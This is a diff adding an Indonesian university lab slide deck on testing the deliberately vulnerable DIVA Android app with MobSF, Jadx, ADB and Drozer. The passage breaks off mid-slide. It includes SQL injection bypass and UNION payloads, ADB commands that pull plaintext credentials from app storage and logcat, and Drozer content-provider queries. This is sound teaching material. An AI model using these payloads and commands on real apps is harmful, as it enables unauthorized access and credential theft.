@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Praktik Week 6 – Pengujian Injeksi & Autentikasi Mobile | RKS222 PSSN</title>
+<style>
+  :root {
+    --pssn-blue: #0d2b6b;
+    --pssn-darkblue: #081a45;
+    --pssn-gold: #e8a020;
+    --pssn-lightgold: #ffd166;
+    --bg-light: #f0f4f8;
+    --text-dark: #1a1a2e;
+    --shadow: 0 4px 20px rgba(0,0,0,0.12);
+    --radius: 12px;
+    --accent-green: #27ae60;
+    --accent-orange: #e67e22;
+    --accent-purple: #8e44ad;
+    --accent-red: #e74c3c;
+    --accent-teal: #16a085;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg-light); color: var(--text-dark); overflow: hidden; height: 100vh; width: 100vw; }
+  #slideshow { width: 100%; height: 100vh; position: relative; }
+  .slide { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; opacity: 0; pointer-events: none; transition: opacity 0.45s ease; overflow-y: auto; }
+  .slide.active { opacity: 1; pointer-events: all; }
+  #navbar { position: fixed; bottom: 0; left: 0; right: 0; z-index: 999; background: var(--pssn-darkblue); display: flex; align-items: center; justify-content: space-between; padding: 10px 24px; gap: 12px; box-shadow: 0 -2px 12px rgba(0,0,0,0.3); }
+  .nav-btn { background: var(--pssn-gold); color: var(--pssn-darkblue); border: none; border-radius: 8px; padding: 8px 22px; font-weight: 700; font-size: 14px; cursor: pointer; transition: background 0.2s, transform 0.1s; }
+  .nav-btn:hover { background: var(--pssn-lightgold); transform: translateY(-1px); }
+  .nav-btn:disabled { background: #555; color: #aaa; cursor: not-allowed; transform: none; }
+  #slide-counter { color: #aaa; font-size: 13px; min-width: 90px; text-align: center; }
+  #progress-bar { flex: 1; height: 6px; background: #333; border-radius: 3px; overflow: hidden; }
+  #progress-fill { height: 100%; background: var(--pssn-gold); border-radius: 3px; transition: width 0.4s ease; }
+  #slide-title-bar { color: #ccc; font-size: 12px; flex: 1.5; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+  .section-label { display: inline-block; background: var(--pssn-gold); color: var(--pssn-darkblue); font-weight: 800; font-size: 11px; letter-spacing: 1.5px; padding: 4px 12px; border-radius: 20px; text-transform: uppercase; margin-bottom: 12px; }
+  .slide-header { background: var(--pssn-blue); padding: 28px 48px 22px; color: white; flex-shrink: 0; }
+  .slide-header h2 { font-size: 22px; font-weight: 800; margin-bottom: 4px; }
+  .slide-header p { font-size: 14px; color: rgba(255,255,255,0.7); }
+  .slide-body { padding: 28px 48px 100px; flex: 1; }
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+  .three-col { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+  .mt8{margin-top:8px;} .mt12{margin-top:12px;} .mt16{margin-top:16px;}
+
+  .card { background: #fff; border-radius: var(--radius); padding: 18px 20px; box-shadow: var(--shadow); }
+  .card h3 { font-size: 15px; font-weight: 700; margin-bottom: 10px; }
+  .card p, .card li { font-size: 13.5px; line-height: 1.7; color: #444; }
+  .card ul { padding-left: 18px; } .card ul li { margin-bottom: 4px; }
+
+  #s0 { background: linear-gradient(135deg, #0d2b6b 0%, #1a3a8f 50%, #7b1fa2 100%); justify-content: center; align-items: center; text-align: center; position: relative; padding: 40px; }
+  #s0::before { content: ''; position: absolute; inset: 0; background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/svg%3E"); }
+  .cover-badge { background: rgba(232,160,32,0.2); border: 1px solid var(--pssn-gold); color: var(--pssn-gold); border-radius: 20px; padding: 6px 18px; font-size: 13px; font-weight: 600; letter-spacing: 1px; margin-bottom: 24px; display: inline-block; }
+  .cover-title { color: white; font-size: 36px; font-weight: 800; line-height: 1.2; margin-bottom: 10px; text-shadow: 0 2px 8px rgba(0,0,0,0.3); }
+  .cover-subtitle { color: var(--pssn-lightgold); font-size: 20px; font-weight: 600; margin-bottom: 6px; }
+  .cover-meta { color: rgba(255,255,255,0.7); font-size: 14px; margin-bottom: 36px; }
+  .cover-divider { width: 80px; height: 3px; background: var(--pssn-gold); border-radius: 2px; margin: 24px auto; }
+  .cover-pills { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; margin-top: 8px; }
+  .cover-pill { background: rgba(255,255,255,0.12); color: white; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; padding: 8px 16px; font-size: 13px; }
+  .cover-pill strong { color: var(--pssn-gold); }
+  .cover-inst { color: rgba(255,255,255,0.6); font-size: 13px; margin-top: 32px; }
+
+  .code-block { background: #1e1e2e; color: #cdd6f4; border-radius: 8px; padding: 14px 16px; font-family: 'Courier New', monospace; font-size: 12.5px; line-height: 1.6; margin: 10px 0; overflow-x: auto; }
+  .code-block .cmd { color: #a6e3a1; }
+  .code-block .comment { color: #6c7086; font-style: italic; }
+  .code-block .kw { color: #cba6f7; }
+  .code-block .str { color: #fab387; }
+  .code-block .out { color: #89dceb; }
+  .code-block .err { color: #f38ba8; }
+  .code-block .flag { color: #f9e2af; font-weight: 700; }
+  .prompt { color: #a6e3a1; }
+
+  .info-box { background: #e3f2fd; border-left: 4px solid var(--pssn-blue); border-radius: 8px; padding: 12px 16px; }
+  .info-box p, .info-box li { font-size: 12.5px; color: #333; line-height: 1.6; }
+  .tip-box { background: linear-gradient(135deg,#fff8e1,#fffde7); border-left: 4px solid var(--pssn-gold); border-radius: 8px; padding: 12px 16px; }
+  .tip-box .tip-label { font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--accent-orange); margin-bottom: 4px; }
+  .tip-box p { font-size: 12.5px; color: #555; line-height: 1.6; }
+  .warn-box { background: #ffebee; border-left: 4px solid var(--accent-red); border-radius: 8px; padding: 12px 16px; }
+  .warn-box .warn-label { font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--accent-red); margin-bottom: 4px; }
+  .warn-box p { font-size: 12.5px; color: #555; line-height: 1.6; }
+  .success-box { background: #e8f5e9; border-left: 4px solid var(--accent-green); border-radius: 8px; padding: 12px 16px; }
+  .success-box .suc-label { font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--accent-green); margin-bottom: 4px; }
+  .success-box p { font-size: 12.5px; color: #1a4a2e; line-height: 1.6; }
+
+  .step-v { display: flex; flex-direction: column; gap: 10px; }
+  .step-v-item { display: flex; gap: 14px; align-items: flex-start; background: #fff; border-radius: 10px; padding: 14px 16px; box-shadow: var(--shadow); }
+  .step-v-num { width: 28px; height: 28px; border-radius: 50%; color: white; font-weight: 800; font-size: 13px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .step-v-body h5 { font-size: 13px; font-weight: 700; color: var(--pssn-blue); margin-bottom: 4px; }
+  .step-v-body p { font-size: 12.5px; color: #555; line-height: 1.5; }
+
+  .tag-red    { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; background: #fdedec; color: #c0392b; }
+  .tag-orange { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; background: #fef9e7; color: #d35400; }
+  .tag-blue   { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; background: #e8f4fd; color: #1a4a6b; }
+  .tag-green  { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; background: #eafaf1; color: #145a32; }
+  .tag-purple { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; background: #f5eef8; color: #7d3c98; }
+
+  .lab-header { border-radius: var(--radius); padding: 14px 20px; margin-bottom: 14px; color: white; }
+  .finding-card { background: #fff; border-radius: var(--radius); padding: 16px 20px; box-shadow: var(--shadow); border-left: 5px solid; margin-bottom: 12px; }
+  .finding-card h4 { font-size: 13px; font-weight: 800; margin-bottom: 6px; }
+  .finding-card p, .finding-card li { font-size: 12.5px; color: #444; line-height: 1.6; }
+  .finding-card ul { padding-left: 16px; }
+
+  .cmp-table { width: 100%; border-collapse: collapse; font-size: 12.5px; margin-top: 10px; }
+  .cmp-table th { background: var(--pssn-blue); color: white; padding: 8px 12px; text-align: left; font-size: 12px; }
+  .cmp-table td { padding: 8px 12px; border-bottom: 1px solid #e0e0e0; color: #444; line-height: 1.5; }
+  .cmp-table tr:nth-child(even) { background: #f8f9ff; }
+  .cmp-table td:first-child { font-weight: 700; color: var(--pssn-blue); }
+  h3.section-h { font-size: 16px; font-weight: 700; color: var(--pssn-blue); margin-bottom: 12px; margin-top: 18px; }
+  h3.section-h:first-child { margin-top: 0; }
+
+  .task-card { background: #fff; border-radius: var(--radius); padding: 20px 24px; box-shadow: var(--shadow); margin-bottom: 14px; border-left: 5px solid; }
+  .task-card h4 { font-size: 15px; font-weight: 800; margin-bottom: 8px; }
+  .task-card p, .task-card li { font-size: 13.5px; color: #444; line-height: 1.7; }
+  .task-card ul { padding-left: 18px; margin-top: 6px; }
+  .task-meta { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 10px; }
+  .task-badge { font-size: 11px; font-weight: 700; padding: 3px 10px; border-radius: 12px; }
+  .tb-red{background:#ffebee;color:#c62828;} .tb-blue{background:#e3f2fd;color:#1565c0;}
+  .tb-green{background:#e8f5e9;color:#2e7d32;} .tb-gold{background:#fff8e1;color:#e65100;}
+  .tb-teal{background:#e0f7fa;color:#00695c;} .tb-purple{background:#f3e5f5;color:#6a1b9a;}
+
+  .rubrik-table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  .rubrik-table th { background: var(--pssn-blue); color: white; padding: 8px 12px; text-align: center; }
+  .rubrik-table td { padding: 8px 12px; border: 1px solid #e0e0e0; text-align: center; vertical-align: top; }
+  .rubrik-table td:first-child { text-align: left; font-weight: 700; color: var(--pssn-blue); }
+</style>
+</head>
+<body>
+<div id="slideshow">
+
+<!-- SLIDE 0: COVER -->
+<div class="slide active" id="s0" data-title="Cover">
+  <div style="position:relative;z-index:1;text-align:center;max-width:820px;margin:auto;">
+    <div class="cover-badge">RKS222 · Praktikum Week 6 · Bobot 15%</div>
+    <div class="cover-title">Lab 6: Pengujian Injeksi &<br>Autentikasi Aplikasi Mobile</div>
+    <div class="cover-subtitle">DIVA Android — Analisis Statis, Dinamis & Dokumentasi Temuan</div>
+    <div class="cover-meta">Sub-CPMK 262.1 & 262.2 · Program Studi Rekayasa Keamanan Siber · PSSN</div>
+    <div class="cover-divider"></div>
+    <div class="cover-pills">
+      <div class="cover-pill"><strong>Target:</strong> DIVA Android APK</div>
+      <div class="cover-pill"><strong>Tools:</strong> MobSF · ADB · Drozer · Jadx</div>
+      <div class="cover-pill"><strong>Durasi:</strong> 2 × 90 menit</div>
+      <div class="cover-pill"><strong>Output:</strong> Laporan Temuan Lab 6</div>
+    </div>
+    <div class="cover-inst">Program Studi Rekayasa Keamanan Siber — Politeknik SSN</div>
+  </div>
+</div>
+
+<!-- SLIDE 1: TUJUAN & SETUP -->
+<div class="slide" id="s1" data-title="Tujuan & Topologi Lab">
+  <div class="slide-header">
+    <div class="section-label">Orientasi Lab</div>
+    <h2>Tujuan Praktikum & Topologi Lab</h2>
+    <p>Sub-CPMK 262.1 — Konfigurasi dan pengoperasian tools uji keamanan mobile</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Tujuan Praktikum</h3>
+        <div class="step-v">
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#c0392b;">1</div>
+            <div class="step-v-body">
+              <h5>Analisis Statis APK</h5>
+              <p>Menggunakan MobSF dan Jadx untuk mengidentifikasi kerentanan di source code DIVA Android tanpa menjalankan aplikasi.</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#e67e22;">2</div>
+            <div class="step-v-body">
+              <h5>Pengujian SQL Injection</h5>
+              <p>Mengeksploitasi kerentanan SQLi pada fitur Login dan Data Storage di DIVA menggunakan ADB dan input manual.</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#8e44ad;">3</div>
+            <div class="step-v-body">
+              <h5>Analisis Penyimpanan Data</h5>
+              <p>Mengekstrak data sensitif dari SharedPreferences, SQLite database, dan logcat menggunakan ADB shell.</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#27ae60;">4</div>
+            <div class="step-v-body">
+              <h5>Dokumentasi Temuan</h5>
+              <p>Mendokumentasikan setiap temuan dengan bukti, deskripsi teknis, dan perhitungan OWASP Risk Score.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Topologi & Prasyarat</h3>
+        <div style="background:#1e1e2e;border-radius:var(--radius);padding:16px 20px;color:#cdd6f4;font-family:monospace;font-size:12.5px;line-height:1.8;">
+          <div style="color:#89dceb;font-weight:700;margin-bottom:8px;">Topologi Lab:</div>
+          <div>┌─────────────────────────────┐</div>
+          <div>│  PC/Laptop Mahasiswa        │</div>
+          <div>│  ├─ Android Studio Emulator │</div>
+          <div>│  │  └─ DIVA Android APK     │</div>
+          <div>│  ├─ ADB (adb.exe)           │</div>
+          <div>│  ├─ Jadx-GUI                │</div>
+          <div>│  ├─ Drozer Console          │</div>
+          <div>│  └─ MobSF (localhost:8000)  │</div>
+          <div>└─────────────────────────────┘</div>
+        </div>
+        <h3 class="section-h mt12">Software yang Diperlukan</h3>
+        <table class="cmp-table">
+          <thead><tr><th>Tool</th><th>Download</th><th>Fungsi</th></tr></thead>
+          <tbody>
+            <tr><td>Android Studio</td><td>developer.android.com</td><td>Emulator + ADB</td></tr>
+            <tr><td>Jadx-GUI</td><td>github.com/skylot/jadx</td><td>APK Decompiler</td></tr>
+            <tr><td>Drozer</td><td>github.com/WithSecureLabs</td><td>IPC Testing</td></tr>
+            <tr><td>MobSF</td><td>github.com/MobSF</td><td>Auto Analysis</td></tr>
+            <tr><td>DIVA APK</td><td>github.com/payatu</td><td>Target Lab</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 2: SETUP ENVIRONMENT -->
+<div class="slide" id="s2" data-title="Setup Environment Lab">
+  <div class="slide-header">
+    <div class="section-label">Lab Setup</div>
+    <h2>Setup Environment — Emulator & Tools</h2>
+    <p>Konfigurasi lingkungan pengujian sebelum memulai eksploitasi</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Langkah Setup Android Emulator</h3>
+        <div class="code-block">
+<span class="comment"># 1. Buat emulator di Android Studio</span>
+<span class="comment">#    AVD Manager → Create → Pixel 4</span>
+<span class="comment">#    Target: Android 9.0 (API 28) Google APIs</span>
+
+<span class="comment"># 2. Jalankan emulator</span>
+<span class="cmd">emulator -avd Pixel_4_API_28</span>
+
+<span class="comment"># 3. Verifikasi ADB terhubung</span>
+<span class="cmd">adb devices</span>
+<span class="out">List of devices attached
+emulator-5554   device</span>
+
+<span class="comment"># 4. Install DIVA APK</span>
+<span class="cmd">adb install DivaApplication.apk</span>
+<span class="out">Performing Streamed Install
+Success</span>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Setup MobSF (Docker)</h3>
+        <div class="code-block">
+<span class="comment"># Pull & jalankan MobSF via Docker</span>
+<span class="cmd">docker pull opensecurity/mobile-security-framework-mobsf</span>
+<span class="cmd">docker run -it -p 8000:8000 \</span>
+<span class="cmd">  opensecurity/mobile-security-framework-mobsf:latest</span>
+
+<span class="comment"># Akses MobSF di browser:</span>
+<span class="out">http://localhost:8000</span>
+<span class="comment"># Upload DIVA APK → klik Analyze</span>
+
+<span class="comment"># Setup Drozer</span>
+<span class="cmd">pip install drozer</span>
+<span class="comment"># Forward port untuk drozer agent</span>
+<span class="cmd">adb forward tcp:31415 tcp:31415</span>
+<span class="cmd">drozer console connect</span>
+<span class="out">Selecting 1 of 1 device ... Connected to drozer Agent.</span>
+        </div>
+        <div class="warn-box mt12">
+          <div class="warn-label">Penting</div>
+          <p>Pastikan emulator sudah berjalan sebelum menjalankan drozer console connect. Install drozer.apk pada emulator sebagai agent terlebih dahulu.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 3: ANALISIS STATIS MobSF -->
+<div class="slide" id="s3" data-title="Lab 6A — Analisis Statis dengan MobSF">
+  <div class="slide-header">
+    <div class="section-label">Lab 6A</div>
+    <h2>Analisis Statis APK dengan MobSF</h2>
+    <p>Mengidentifikasi kerentanan DIVA Android secara otomatis tanpa menjalankan aplikasi</p>
+  </div>
+  <div class="slide-body">
+    <div class="lab-header" style="background:linear-gradient(135deg,#c0392b,#922b21);">
+      <h3 style="font-size:15px;font-weight:800;">Skenario: Analisis APK DIVA (Damn Insecure and Vulnerable App)</h3>
+      <p style="font-size:13px;opacity:0.9;margin-top:4px;">DIVA adalah aplikasi Android yang dirancang khusus untuk belajar pengujian keamanan mobile. Terdapat 13 tantangan kerentanan berbeda.</p>
+    </div>
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Langkah Analisis MobSF</h3>
+        <div class="step-v">
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#2980b9;">1</div>
+            <div class="step-v-body">
+              <h5>Upload APK</h5>
+              <p>Buka <code>http://localhost:8000</code> → drag & drop <code>DivaApplication.apk</code> → klik Analyze</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#c0392b;">2</div>
+            <div class="step-v-body">
+              <h5>Periksa Manifest Issues</h5>
+              <p>Klik "Android Manifest" → catat semua exported components dan missing permissions</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#e67e22;">3</div>
+            <div class="step-v-body">
+              <h5>Periksa Code Analysis</h5>
+              <p>Klik "Code Analysis" → catat HIGH dan CRITICAL findings → perhatikan kategori: SQL Injection, Hardcoded Secrets, Insecure Storage</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#27ae60;">4</div>
+            <div class="step-v-body">
+              <h5>Export Laporan</h5>
+              <p>Klik "Generate PDF Report" → simpan sebagai bukti analisis statis</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Temuan yang Diharapkan di MobSF</h3>
+        <table class="cmp-table">
+          <thead><tr><th>Temuan</th><th>Severity</th><th>Kategori</th></tr></thead>
+          <tbody>
+            <tr><td>android:allowBackup=true</td><td><span class="tag-orange">MED</span></td><td>Manifest</td></tr>
+            <tr><td>Exported Activity (DivaActivity)</td><td><span class="tag-red">HIGH</span></td><td>Manifest</td></tr>
+            <tr><td>SQLite rawQuery() usage</td><td><span class="tag-red">HIGH</span></td><td>Code Analysis</td></tr>
+            <tr><td>Hardcoded credentials</td><td><span class="tag-red">HIGH</span></td><td>Code Analysis</td></tr>
+            <tr><td>External Storage usage</td><td><span class="tag-orange">MED</span></td><td>Code Analysis</td></tr>
+            <tr><td>Log.d() dengan data sensitif</td><td><span class="tag-orange">MED</span></td><td>Code Analysis</td></tr>
+          </tbody>
+        </table>
+        <div class="tip-box mt12">
+          <div class="tip-label">Tugas Screenshot</div>
+          <p>Screenshot halaman "Summary" MobSF yang menampilkan total findings. Ini merupakan bagian dari lampiran laporan Anda.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 4: ANALISIS STATIS JADX -->
+<div class="slide" id="s4" data-title="Lab 6A — Analisis Source Code dengan Jadx">
+  <div class="slide-header">
+    <div class="section-label">Lab 6A (Lanjutan)</div>
+    <h2>Analisis Source Code DIVA dengan Jadx</h2>
+    <p>Decompile APK dan temukan kerentanan hardcoded credentials serta logika autentikasi</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Langkah Decompile dengan Jadx</h3>
+        <div class="code-block">
+<span class="comment"># Decompile APK via command line</span>
+<span class="cmd">jadx -d diva_output/ DivaApplication.apk</span>
+<span class="out">INFO  - loading ...
+INFO  - processing ...
+INFO  - done</span>
+
+<span class="comment"># Atau gunakan Jadx-GUI (lebih mudah)</span>
+<span class="comment"># File → Open file → pilih APK</span>
+
+<span class="comment"># Cari hardcoded credentials</span>
+<span class="cmd">grep -r "password\|secret\|key\|token" \</span>
+<span class="cmd">  diva_output/sources/</span>
+        </div>
+        <h3 class="section-h mt12">Temukan di Jadx-GUI</h3>
+        <div class="step-v">
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#c0392b;">1</div>
+            <div class="step-v-body">
+              <h5>Buka Hardcoded Issues</h5>
+              <p>Cari file <code>HardCodeActivity.java</code> — temukan hardcoded vendor key/API credential</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#e67e22;">2</div>
+            <div class="step-v-body">
+              <h5>Cari rawQuery()</h5>
+              <p>Gunakan Find Usage (Ctrl+F) → cari "rawQuery" → perhatikan bagaimana parameter dibangun</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#8e44ad;">3</div>
+            <div class="step-v-body">
+              <h5>Analisis AndroidManifest.xml</h5>
+              <p>Cari <code>android:exported="true"</code> pada setiap komponen</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Contoh Temuan di Source Code DIVA</h3>
+        <div class="finding-card" style="border-left-color:#c0392b;">
+          <h4 style="color:#c0392b;">SQLi di SQLInjectionActivity.java</h4>
+          <div class="code-block" style="font-size:11px;">
+<span class="comment">// Baris rentan di DIVA:</span>
+<span class="kw">Cursor</span> c = mDB.rawQuery(
+  <span class="str">"SELECT * FROM sqliuser WHERE username='"</span>
+  + uname + <span class="str">"' AND password='"</span>
+  + pwd + <span class="str">"'"</span>, <span class="kw">null</span>);
+          </div>
+          <p style="margin-top:8px;font-size:12px;"><strong>Bukti:</strong> screenshot kode di jadx, lokasi file, nomor baris</p>
+        </div>
+        <div class="finding-card mt8" style="border-left-color:#e67e22;">
+          <h4 style="color:#d35400;">Hardcoded Key di HardCodeActivity.java</h4>
+          <div class="code-block" style="font-size:11px;">
+<span class="comment">// Hardcoded vendor key ditemukan:</span>
+<span class="kw">private static final</span> String vKey =
+  <span class="str">"[hardcoded vendor key]"</span>;
+          </div>
+          <p style="margin-top:8px;font-size:12px;"><strong>Bukti:</strong> screenshot dengan highlight pada string tersebut</p>
+        </div>
+        <div class="success-box mt8">
+          <div class="suc-label">Catat untuk Laporan</div>
+          <p>Untuk setiap temuan: nama file, nomor baris, kutipan kode, dan penjelasan mengapa itu rentan.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 5: LAB SQL INJECTION MOBILE -->
+<div class="slide" id="s5" data-title="Lab 6B — SQL Injection pada DIVA">
+  <div class="slide-header">
+    <div class="section-label">Lab 6B</div>
+    <h2>Pengujian SQL Injection pada DIVA Android</h2>
+    <p>Eksploitasi langsung kerentanan SQLi di challenge "Input Validation Issues" DIVA</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Challenge: Input Validation Issues — Part 1</h3>
+        <p style="font-size:13px;color:#555;margin-bottom:10px;">Buka DIVA di emulator → pilih "Input Validation Issues — Part 1" (Login dengan SQLi)</p>
+        <div class="code-block">
+<span class="comment">## Langkah eksploitasi SQLi di DIVA:</span>
+
+<span class="comment"># 1. Buka challenge login di DIVA</span>
+<span class="comment">#    Username: ' OR '1'='1</span>
+<span class="comment">#    Password: apapun</span>
+
+<span class="comment"># 2. Payload UNION-based (jika ada output)</span>
+<span class="comment">#    Username: ' UNION SELECT username,</span>
+<span class="comment">#    password FROM sqliuser--</span>
+
+<span class="comment"># 3. Bypass autentikasi klasik:</span>
+<span class="str">admin' --</span>
+<span class="str">' OR 1=1--</span>
+<span class="str">anything' OR '1'='1</span>
+        </div>
+        <div class="success-box mt12">
+          <div class="suc-label">Berhasil jika</div>
+          <p>Aplikasi menampilkan data dari database atau melakukan login tanpa credential yang benar. Screenshot popup/toast yang muncul sebagai bukti.</p>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Verifikasi via ADB Shell</h3>
+        <div class="code-block">
+<span class="comment"># Akses langsung database DIVA via ADB</span>
+<span class="cmd">adb shell</span>
+<span class="out">generic_x86:/ $</span>
+
+<span class="comment"># Masuk ke data directory DIVA</span>
+<span class="cmd">run-as jakhar.aseem.diva</span>
+<span class="cmd">ls databases/</span>
+<span class="out">diva.db</span>
+
+<span class="comment"># Query langsung database</span>
+<span class="cmd">sqlite3 databases/diva.db</span>
+<span class="cmd">sqlite> .tables</span>
+<span class="out">sqliuser</span>
+<span class="cmd">sqlite> SELECT * FROM sqliuser;</span>
+<span class="out">admin|password123
+user1|pass456</span>
+        </div>
+        <div class="tip-box mt12">
+          <div class="tip-label">Dokumentasi Wajib</div>
+          <p>Screenshot: (1) Payload yang diinput di field, (2) Hasil/respon aplikasi, (3) Data yang terekspos dari sqlite3. Semua 3 screenshot diperlukan untuk 1 finding SQLi.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 6: LAB INSECURE DATA STORAGE -->
+<div class="slide" id="s6" data-title="Lab 6C — Analisis Insecure Data Storage">
+  <div class="slide-header">
+    <div class="section-label">Lab 6C</div>
+    <h2>Analisis Insecure Data Storage pada DIVA</h2>
+    <p>Menemukan data sensitif yang tersimpan tanpa perlindungan memadai — 4 level tantangan</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Buka App & Buat Data Uji</h3>
+        <p style="font-size:13px;color:#555;margin-bottom:10px;">Buka DIVA → "Insecure Data Storage" Part 1–4 → masukkan username dan password → Save</p>
+        <div class="code-block">
+<span class="comment">## Part 1 — SharedPreferences</span>
+<span class="cmd">adb shell run-as jakhar.aseem.diva</span>
+<span class="cmd">cat shared_prefs/jakhar.aseem.diva_preferences.xml</span>
+<span class="out">&lt;string name="password"&gt;mypassword&lt;/string&gt;
+&lt;string name="user"&gt;admin&lt;/string&gt;</span>
+
+<span class="comment">## Part 2 — SQLite Database</span>
+<span class="cmd">sqlite3 databases/ids2</span>
+<span class="cmd">sqlite> SELECT * FROM myuser;</span>
+<span class="out">admin|mysecretpassword</span>
+        </div>
+        <div class="code-block">
+<span class="comment">## Part 3 — External Storage</span>
+<span class="cmd">adb shell ls /sdcard/</span>
+<span class="out">uinfo</span>
+<span class="cmd">adb pull /sdcard/uinfo</span>
+<span class="cmd">cat uinfo</span>
+<span class="out">admin:supersecret123  ← data plaintext!</span>
+
+<span class="comment">## Part 4 — Temporary Files</span>
+<span class="cmd">find /data/local/tmp/ -name "*diva*"</span>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Analisis Log Sensitif</h3>
+        <div class="code-block">
+<span class="comment"># Monitor logcat untuk data sensitif</span>
+<span class="cmd">adb logcat | grep -i "diva\|password\|secret"</span>
+<span class="out">D/DIVA: Credentials: admin:password123
+D/DIVA: Token: eyJhbGci...</span>
+
+<span class="comment"># Filter hanya tag DIVA</span>
+<span class="cmd">adb logcat -s DIVA:D</span>
+        </div>
+        <h3 class="section-h mt12">Tabel Temuan Data Storage</h3>
+        <table class="cmp-table">
+          <thead><tr><th>Part</th><th>Lokasi</th><th>Data Terekspos</th><th>Risk</th></tr></thead>
+          <tbody>
+            <tr><td>Part 1</td><td>SharedPreferences</td><td>Username, Password</td><td><span class="tag-red">HIGH</span></td></tr>
+            <tr><td>Part 2</td><td>SQLite (ids2)</td><td>Credentials plaintext</td><td><span class="tag-red">HIGH</span></td></tr>
+            <tr><td>Part 3</td><td>/sdcard/uinfo</td><td>Username:Password</td><td><span class="tag-red">HIGH</span></td></tr>
+            <tr><td>Part 4</td><td>Temp file / Log</td><td>Session data</td><td><span class="tag-orange">MED</span></td></tr>
+          </tbody>
+        </table>
+        <div class="success-box mt12">
+          <div class="suc-label">Berhasil jika</div>
+          <p>Menemukan data username/password yang tersimpan dalam format plaintext di keempat lokasi berbeda.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 7: LAB DROZER IPC TESTING -->
+<div class="slide" id="s7" data-title="Lab 6D — IPC Testing dengan Drozer">
+  <div class="slide-header">
+    <div class="section-label">Lab 6D</div>
+    <h2>Pengujian IPC & Exported Components dengan Drozer</h2>
+    <p>Menemukan dan mengeksploitasi attack surface Android via IPC (Content Provider, Activity)</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Scanning Attack Surface</h3>
+        <div class="code-block">
+<span class="comment"># Lihat attack surface DIVA</span>
+<span class="cmd">dz> run app.package.attacksurface jakhar.aseem.diva</span>
+<span class="out">Attack Surface:
+  1 activities exported
+  0 broadcast receivers exported
+  2 content providers exported
+  0 services exported</span>
+
+<span class="comment"># Identifikasi content providers</span>
+<span class="cmd">dz> run app.provider.finduri jakhar.aseem.diva</span>
+<span class="out">content://jakhar.aseem.diva.names
+content://jakhar.aseem.diva.notes</span>
+
+<span class="comment"># Query content provider</span>
+<span class="cmd">dz> run app.provider.query</span>
+<span class="cmd">   content://jakhar.aseem.diva.names</span>
